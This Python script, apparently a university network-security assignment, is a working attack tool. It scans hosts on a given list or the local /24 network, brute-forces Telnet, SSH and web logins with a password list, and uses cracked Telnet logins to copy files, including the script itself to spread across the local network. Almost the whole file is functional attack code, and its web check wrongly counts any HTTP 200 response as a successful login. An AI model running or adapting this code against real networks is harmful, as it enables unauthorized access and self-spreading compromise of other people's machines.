#!/usr/bin/python3
# 
# Republic of Ireland
# Munster Technological University
# Department of Computer Science
# Student: Jose Lo Huang
#
# Python Script net_attack.py
# Creation Date: 29/11/2021
# Updates:
# 01/12/2021 - Add functions read_ip_list, is_reachable and scan_port
# 02/12/2021 - Add functions bruteforce_telnet
# 03/12/2021 - Add functions bruteforce_ssh and bruteforce_web
# 04/12/2021 - Modify the code to accept -d flag
# 06/12/2021 - Modify the code to accept -L and -P flags
# 07/12/2021 - Tests, edge cases and add comments and documentation
# 
# This code scans hosts and ports from a list of IPs provided to check if they 
# are available and attempt brute force to login to those systems, and optionally
# send files.
#

#
# Import the required packages
# 

import sys
from scapy.all import *
from telnetlib import Telnet
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException
import requests

# Skip the output from scapy
conf.verb = 0

#
# This function shows the header of the program and provide the exit method. 
#

def header():
  print("===================================================================")
  print("Network Tool net_attack.py v7.0                                    ")
  print("Powered by Python3, Scapy, telnetLib, Paramiko and requests.       ")
  print("Author: Jose Lo Huang. All rights reserved using the MIT License.  ")
  print("Complete instructions on the README.txt file. Hit Ctrl+C to exit.  ")
  print("===================================================================")

#
# This function shows the tool usage to the user.
#

def help():
  print("\n  \
         Network Tool net_attack.py \n \
        ")
  print("Usage: sudo ./net_attack.py {-t <file_name>|-L} -p <port_list> -u <user> -f <pwd_file> [{-d <file_to_transfer.txt>|-P}]")
  print()
  print("-t <file_name>: The file with the IP list.")
  print("-L : Scan all the local /24 network.")
  print("-p <port_list>: The list of ports to scan.")
  print("-u <user>: The user to attack.")
  print("-f <pwd_file>: The file with sample passwords.")
  print("-d <file_to_transfer.txt>: The optional file to transfer to the target hosts.")
  print("-P : Optional if you want to propagate the script bundle on the local /24 network.") 
  print()
  print("Example 1: ./net_attack.py -t ip_list.txt -p 22,23,80 -u admin -f pwd_list.txt ")
  print("Example 2: ./net_attack.py -L -p 22,80 -u admin -f pwd_list.txt -P ")
  print("Example 3: ./net_attack.py -t ip_list.txt -p 22,80 -u admin -f pwd_list.txt -d file.txt")
  print() 
  exit()

#
# This function checks if the user arguments are correct.
# Input:
# arguments  - The argument list provided by the user
# new_values - The dictionary where the user values will be stored
# Output:
# transfer - A boolean that indicates if the user wants to transfer or propagates files
#

def check_args(args, new_values):
  # Mode 1 (-t & -d)
  if args[1] == '-t' :
    if args[1] != '-t' or args[3] != '-p' or args[5] != '-u' or args[7] != '-f' or len(args) == 10 or len(args) > 11 :
      help()
    else:
      # Assign the session values
      new_values['ip_list'] = args[2]
      new_values['ports'] = args[4]
      new_values['user'] = args[6]
      new_values['pwd_file'] = args[8]
    # Optional parameters
    if len(args) >= 11:
      if args[9] != '-d':
        help()
      else:
        new_values['transfer_file'] = []
        new_values['transfer_file'].append(args[10])
        return True
    return False
  # Mode 2 (-L & -P)
  elif args[1] == '-L' :
    if args[1] != '-L' or args[2] != '-p' or args[4] != '-u' or args[6] != '-f' or len(args) > 9 :
      help()
    else:
      # Self-Propagation
      try:
        # Open a file to write the local /24 network hosts
        lhosts = open('lhosts.txt','w')
        # Check all the interfaces on this host
        if_list = get_if_list()
        for iface in if_list:
            local_ip = get_if_addr(iface)
            # Get the /24 network part from the IP
            separator = "."
            network = separator.join(local_ip.split(separator, 3)[:-1])
            # Iterate over all the 256 hosts from the /24 network and write them on the file
            for i in range(0,256):
              host = network+"."+str(i)
              lhosts.write(host+"\n")
        lhosts.close()
      except:
        print("There was an issue while writing the hosts file and scapy.") 
        print("Maybe you are not running the script as root or with sudo.")
      # Assign the session values
      new_values['ip_list'] = 'lhosts.txt'
      new_values['ports'] = args[3]
      new_values['user'] = args[5]
      new_values['pwd_file'] = args[7]
    # Optional parameters
    if len(args) >= 9:
      if args[8] != '-P':
        help()
      else:
        new_values['transfer_file'] = []
        new_values['transfer_file'].append('net_attack.py')
        new_values['transfer_file'].append(args[7])
        return True
    return False
  # Otherwise
  else :
    help()
  return False

# 
# This function read an IP list from a file and store it on a list object.
# Input:
# ip_file - The file where the IP list is written
# Output:
# ip_list - A list with all the IP addresses from the file
# References:
# https://docs.python.org/3/tutorial/inputoutput.html
#  

def read_ip_list(ip_file):
  try:
    ip_list = []
    f = open(ip_file, 'r')
    for readline in f:
      ip_list.append(readline.strip())
    f.close()
    return ip_list
  except:
    print("There is a problem reading the ip list file = ", ip_file)
    print("Maybe the file doesn't exists or you don't have proper permissions.")
    exit()

# 
# This function checks if an IP address reply to ICMP requests.
# Input:
# ip - The ip to check
# Output:
# A boolean indicating if the host is available via ICMP.
# References:
# https://scapy.readthedocs.io/en/latest/usage.html
# https://scapy.readthedocs.io/en/latest/routing.html
# https://scapy.readthedocs.io/en/latest/api/scapy.interfaces.html
# 

def is_reachable(ip):
    print(">>>>>>>>>>>>>>>>>>>>")
    print("Sending ICMP to "+ip)
    try:
      # Send an ICMP message to the host
      ans = sr1(IP(dst=ip)/ICMP(), timeout=2)
      # If the answer is None, the IP is unreachable
      # Otherwise, check if the ICMP reply was correct
      if ans is not None:
        ans_list = (ans[0].summary()).split(' ')
      else:
        return False
    except:
      print("There was an issue with the sr1 command (ICMP).") 
      print("Maybe you are not running the script as root or with sudo.")
      exit()
    # If the host reply the ICMP, return True
    if len(ans_list) > 6:
      if ans_list[6] == 'echo-reply':
        return True
      else:
        return False
    else:
      return False

# 
# This function scan the port provided on the IP host using the sr1 function from scapy.
# Input:
# ip - The IP address to scan
# port - The port to scan
# Output:
# A boolean indicating if the port is open or not on this host
# References:
# https://scapy.readthedocs.io/en/latest/usage.html 
# 

def scan_port(ip, port):
  try:
    # Send a TCP/IP packet to check if the port is open on this host
    ans = sr1(IP(dst=ip)/TCP(dport=int(port),flags="S"), timeout=2)
    if ans is not None:
      # Extract the summary from the reply as a list
      ans_sum = (ans.summary( lambda s,r: r.sprintf("%TCP.sport% \t %TCP.flags%") )).split(' ')
    else:
      return False
    # If the size is lower than 6 then is closed
    if len(ans_sum) > 6:
      # Only if the flag is SA the port is open
      if (ans_sum[6] == 'SA'):
        return True
      else:
        return False
    else:
      return False
  except:
      print("There was an issue with the sr1 command (TCP SYN).")
      print("Maybe the port is not correct, you are not running the script as root ")
      print("or with sudo.")
      exit()

# 
# This function encodes a string using the ASCII format.
# Input:
# s - A string to encrypt
# Output:
# s - The string encoded with ASCII format
# 

def enc(s):
  return s.encode("ascii")

#
# This function reads a file with all the sample passwords and append them on a list object.
# Input:
# pwd_file - The file with the list of passwords
# Output:
# pwd_list - A list with all the passwords from the file
# References:
# https://docs.python.org/3/tutorial/inputoutput.html
#

def read_pwd_list(pwd_file):
  try:
    pwd_list = []
    f = open(pwd_file, 'r')
    for readline in f:
      pwd_list.append(readline.strip())
    f.close()
    return pwd_list
  except:
    print("There is a problem reading the password list file = ", pwd_file)
    print("Maybe the file doesn't exists or you don't have proper permissions.")
    exit()

# 
# This function attempts a bruteforce login via telnet.
# Input:
# ip - The host to attack
# port - The port where telnet is running
# username - The username to attack
# password_list_filename - A file with all the sample passwords to test
# Output:
# A string with the username and password if a match found or a empty string if not.
# References:
# https://docs.python.org/3/library/telnetlib.html
# 

def bruteforce_telnet(ip, port, username, password_list_filename):
  # Read the password file and append the samples on a list
  pwd_list = read_pwd_list(password_list_filename)
  # For each sample password try to login
  for pwd in pwd_list:
    try:
      # Check if the user/password combination works
      tel = Telnet(ip, int(port))
      tel.read_until(enc("login:"))
      tel.write(enc(username + "\n"))
      tel.read_until(enc("Password:"))
      tel.write(enc(pwd + "\n"))
      # Get banner
      data = tel.read_until(enc("Welcome to"), timeout=1)
      data = data.decode("ascii")
      # If the password works, then return the user:pwd combination
      if ("Welcome to" in data):
        return username+":"+pwd
    except:
      print("There was an issue with the telnet command.")
      exit()
  # No password found
  return ""

# 
# This function attempts a bruteforce login via SSH.
# Input:
# ip - The host to attack
# port - The port where telnet is running
# username - The username to attack
# password_list_filename - A file with all the sample passwords to test
# Output:
# A string with the username and password if a match found or a empty string if not.
# References:
# https://docs.paramiko.org/en/stable/api/client.html
# 

def bruteforce_ssh(ip, port, username, password_list_filename):
  # Read all the sample passwords and append them on a list
  pwd_list = read_pwd_list(password_list_filename)
  # For each sample password
  for pwd in pwd_list:
    try:
      # Try to connect using the user/pwd combination
      client = SSHClient()
      client.set_missing_host_key_policy(AutoAddPolicy())
      client.connect(ip, username=username, password=pwd, banner_timeout=200, timeout=2, auth_timeout=2)
      client.close()
      # If no SSH error was triggered, the connection was made
      # Return the user:pwd combination
      return username+":"+pwd
    except:
      # For SSH errors, ignore them and continue with the next password
      pass
  # No password found
  return ""

# 
# This function attempts a bruteforce login via web.
# Input:
# ip - The host to attack
# port - The port where telnet is running
# username - The username to attack
# password_list_filename - A file with all the sample passwords to test
# Output:
# A string with the username and password if a match found or a empty string if not.
# References:
# https://docs.python-requests.org/en/master/
# 

def bruteforce_web(ip, port, username, password_list_filename):
  # Read all the sample passwords and append them on a list
  pwd_list = read_pwd_list(password_list_filename)
  try:
    # First check if the IP:port combination is a webserver
    resp = requests.get("http://"+ip+":"+port)
    if (resp.status_code == 200):
      # If is a webserver, then check if it has a login.php page
      php_is_on = requests.get("http://"+ip+":"+port+"/login.php")
      if php_is_on.status_code == 200:
        # If it has the login.php page, then test each sample password
        for pwd in pwd_list:
          data = {}
          data['username'] = username
          data['password'] = pwd  
          login_test = requests.post("http://"+ip+":"+port+"/login.php", data)
          # If the login reply is success, then return the user:pwd combination
          if (login_test.status_code == 200):
            return username+":"+pwd
  except:
    print("There was an issue with the GET or POST command.")
  # No password found
  return ""

# 
# This function transfers a list of files to another host.
# Input:
# ip - The host where the file will be transferred
# port - The port to be used (SSH or Telnet)
# user - The user available to connect
# pwd - The password for the user to connect
# file_transf_list - A list of files to be transferred
# 

def file_transfer(ip, port, user, pwd, file_transf_list):
  # For each file to transfer from the list
  for file_transf in file_transf_list:
    # Transfer with SSH
    if int(port) == 22:
      ''' This section is not working properly, will check in the next version 
      # Sometimes work and sometimes not.
      # The SSH connection is failing with:
      # "paramiko.ssh_exception.SSHException: Error reading SSH protocol banner"
      # Tested several solutions from the web, but still not completely fixed.
      try:
        # Connect to the host
        client = SSHClient()
        client.set_missing_host_key_policy(AutoAddPolicy())
        client.connect(ip, username=user, password=pwd, banner_timeout=200, timeout=2, auth_timeout=2)
        # Open file and send it through the client line by line
        try:
          f = open(file_transf, 'r')
          # Create the file and write the first line
          line = f.readline()
          # If empty file
          if not line:
            command = 'touch ' + file_transf  
            stdin, stdout, stderr = client.exec_command(command)
          # Otherwise, copy the first line
          else:
            command = 'echo "'+line+'" > '+file_transf 
            stdin, stdout, stderr = client.exec_command(command)
          # Copy all the other lines
          while True:
            line = f.readline()
            # EOF
            if not line:
              print("Copy finished.")
              break
            else:
              command = 'echo "'+line+'" >> file_transf'  
              stdin, stdout, stderr = client.exec_command(command)
          # Check file copied
          stdin, stdout, stderr = client.exec_command("ls -l "+file_transf)
          print(stdout.read().decode("ascii"))
          client.close()
          return True
        except:
          print("There was an issue while copying the file.")
          print("Check that the file exists and you have proper permissions.")
      except:
        print("There was an issue with the SSH COPY command.")
      '''
    # Transfer with Telnet 
    else:
      try:
        # Connect to the host via Telnet
        tel = Telnet(ip, int(port))
        tel.read_until(enc("login:"))
        tel.write(enc(user + "\n"))
        tel.read_until(enc("Password:"))
        tel.write(enc(pwd + "\n"))
        # Get banner
        data = tel.read_until(enc("Welcome to"), timeout=1)
        data = data.decode("ascii")
        # If the connection is successful
        if ("Welcome to" in data):
          # Open file and send it through the client line by line
          try:
            f = open(file_transf, 'r')
            # Create the file and write the first line
            line = f.readline()
            # If empty file
            if not line:
              command = 'touch ' + file_transf       
              tel.write(enc(command+"\n"))
            # Otherwise, copy the first line
            else:
              command = 'echo "'+line+'" > '+file_transf 
              tel.write(enc(command+"\n"))
            # Copy all the other lines
            while True:
              line = f.readline()
              # EOF, then finish the session
              if not line:
                print("Copy finished.")
                tel.write(enc("exit\n"))
                break
              else:
                command = 'echo "'+line+'" >>'+file_transf
                tel.write(enc(command+"\n"))
          except:
            print("There was an issue while copying the file.")
            print("Check that the file exists and you have proper permissions.")
        return True
      except:
        print("There was an issue with the Telnet PUT command.")
    return False


#
# Main program
# 

def main():
  # Dictionary to store the values for this session
  new_values = {}
  # Parameter to indicate if the user want to transfer any files (-d or -P flags)
  transfer = False
  # Check if the arguments are correct
  if len(sys.argv) >= 8:
    transfer = check_args(sys.argv, new_values)
  else:
    help()
  # Print header
  header()
  print("Your input values are: ", new_values)
  print()
  # Read IP addresses
  print("########## READ IP ADDRESSES ##########")
  ip_list = read_ip_list(new_values['ip_list'])
  print("IP list = ", ip_list)
  print()
  # Verify connectivity
  print("########## VERIFY CONNECTIVITY ##########")
  avail_hosts = []
  # For each IP iin the list, check if it is available
  for ip in ip_list:
    # If is available, then append it to avail_hosts
    if is_reachable(ip):
      avail_hosts.append(ip)
  # Now ip_list contains only the available hosts
  ip_list = avail_hosts
  print()
  print("Available hosts = ", ip_list)
  print()
  # Port scan
  print("########## PORT SCAN  ##########")
  ports = (new_values['ports']).split(',')
  print("Ports = ", ports)
  # For each host on the list
  for ip in ip_list:
    # This parameter tell us if the files were already transferred to the current host
    transferred = False
    print()
    print(">>>>>>>>>> IP = ", ip)
    # Check each port requested by the user
    for port in ports:
      print(">>>>>>>>>>>>>>>>>>>>>")
      if scan_port(ip, port):
        print("The port = ", port, " in the host = ", ip, " is open.")
        # Bruteforce Telnet
        if (int(port) == 23):
          print("########## BRUTEFORCE TELNET  ##########")
          weak_combo = bruteforce_telnet(ip, port, new_values['user'], new_values['pwd_file'])
          if weak_combo != "":
            print("Telnet works with the user:pwd combination = ", weak_combo)
            if transfer and not transferred:
              # Deploying Files
              print("########## DEPLOYING FILES  ##########")
              transferred = file_transfer(ip, port, new_values['user'], weak_combo.split(":")[1], new_values['transfer_file'])

        # Bruteforce SSH
        elif (int(port) == 22):
          print("########## BRUTEFORCE SSH  ##########")
          weak_combo = bruteforce_ssh(ip, port, new_values['user'], new_values['pwd_file'])
          if weak_combo != "":
            print("SSH works with the user:pwd combination = ", weak_combo)
            # If the user want to transfer files
            if transfer and not transferred:
              # Deploying Files
              print("########## DEPLOYING FILES  ##########")
              transferred = file_transfer(ip, port, new_values['user'], weak_combo.split(":")[1], new_values['transfer_file'])
        # Bruteforce WEB
        elif (int(port) in (80, 8080, 8888)):
          print("########## BRUTEFORCE WEB  ##########")
          weak_combo = bruteforce_web(ip, port, new_values['user'], new_values['pwd_file'])
          if weak_combo != "":
            print("WEB works with the user:pwd combination = ", weak_combo)
      else:
        # If the port is close 
        print("The port = ", port, " in the host = ", ip, " is closed.")
  exit()

#
# Run the main program
#

main()


